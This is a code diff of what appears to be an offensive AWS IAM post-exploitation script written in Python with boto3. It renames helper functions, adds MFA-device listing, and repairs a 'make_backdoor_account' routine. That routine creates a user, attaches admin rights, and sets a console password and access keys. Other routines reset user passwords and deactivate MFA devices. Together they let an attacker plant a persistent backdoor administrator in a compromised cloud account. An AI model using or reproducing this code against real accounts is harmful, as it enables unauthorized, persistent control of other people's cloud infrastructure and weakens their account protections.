@@ -67,13 +67,14 @@ def check_root_account():
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
 
-def change_user_console_password(username, password):
+def iam_change_user_console_password(username, password):
     client = boto3.client('iam', region_name=region)
 
     try:
         response = client.update_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
         print('Changing password for user: {} to password: {}' .format(username, password))
-        print('Response to password change was: []' .format(response['ResponseMetadata']['HTTPStatusCode']))
+        # print(response)
+        print('Response to password change was: {}' .format(response['ResponseMetadata']['HTTPStatusCode']))
     except botocore.exceptions.ClientError as e:
         if e.response['Error']['Code'] == 'PasswordPolicyViolation':
             print("Password policy violation. Manually check password policy")
@@ -85,7 +86,7 @@ def change_user_console_password(username, password):
         print("CTRL-C received, exiting...")
 
 
-def create_user_console_password(username, password):
+def iam_create_user_console_password(username, password):
     client = boto3.client('iam', region_name=region)
 
     try:
@@ -115,7 +116,7 @@ def get_password_policy():
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
 
-def create_user(username):
+def iam_create_user(username):
     client = boto3.client('iam', region_name=region)
 
     try:
@@ -132,7 +133,7 @@ def create_user(username):
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
 
-def create_access_key( username):
+def iam_create_access_key(username):
     client = boto3.client('iam', region_name=region)
 
     try:
@@ -144,7 +145,7 @@ def create_access_key( username):
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
 
-def delete_access_key(username, accesskey):
+def iam_delete_access_key(username, accesskey):
     client = boto3.client('iam', region_name=region)
 
     try:
@@ -160,11 +161,11 @@ def delete_access_key(username, accesskey):
         print("CTRL-C received, exiting...")
 
 #untested :-/ but should work #TODO
-def delete_mfa_device(username, mfaserial):
+def iam_delete_mfa_device(username, mfaserial):
     client = boto3.client('iam', region_name=region)
     try:
         delete_mfa = client.deactivate_mfa_device(UserName=username, SerialNumber=mfaserial)
-        print("Deleting a MFA device: {} for: {}" .format(mfaserial, username))
+        print("Deleting MFA device: {} for: {}" .format(mfaserial, username))
         print('Response to delete MFA devices was: {}' .format(delete_mfa['ResponseMetadata']['HTTPStatusCode']))
     except botocore.exceptions.ClientError as e:
         if e.response['Error']['Code'] == 'NoSuchEntity':
@@ -174,8 +175,34 @@ def delete_mfa_device(username, mfaserial):
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
 
+def iam_list_mfa_device(username):
+    client = boto3.client('iam', region_name=region)
+    try:
+        response = client.list_mfa_devices(UserName=username)
+        # print(response)
+        if response.get('MFADevices') is None:
+            print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
+        elif len(response['MFADevices']) <= 0:
+            print("[-] ListMFADevices allowed for {} but no results [-]" .format(region))
+        else:
+            print("### MFA info for {} ###".format(username))
+            for device in response['MFADevices']:
+                pp.pprint(device)
+        print("\n")
 
-def make_admin(username):
+    except botocore.exceptions.ClientError as e:
+        if e.response['Error']['Code'] == 'InvalidClientTokenId':
+            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
+        elif e.response['Error']['Code'] == 'AccessDenied':
+            print('{} : Does not have the required permissions' .format(AWS_ACCESS_KEY_ID))
+        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
+            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
+        else:
+            print("Unexpected error: {}" .format(e))
+    except KeyboardInterrupt:
+        print("CTRL-C received, exiting...")
+
+def iam_make_admin(username):
     client = boto3.client('iam', region_name=region)
 
     try:
@@ -191,15 +218,15 @@ def make_admin(username):
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
 
-def make_backdoor_account( username, password):
+def iam_make_backdoor_account( username, password):
     client = boto3.client('iam', region_name=region)
 
     try:
-        print("making backdoor account with username: {}" .format(username))
-        create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
-        make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
-        create_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password)
-        create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
+        print("Making backdoor account with username: {}" .format(username))
+        iam_create_user(username)
+        iam_make_admin(username)
+        iam_create_user_console_password(username, password)
+        iam_create_access_key(username)
 
     except botocore.exceptions.ClientError as e:
         print("Unexpected error: {}" .format(e))
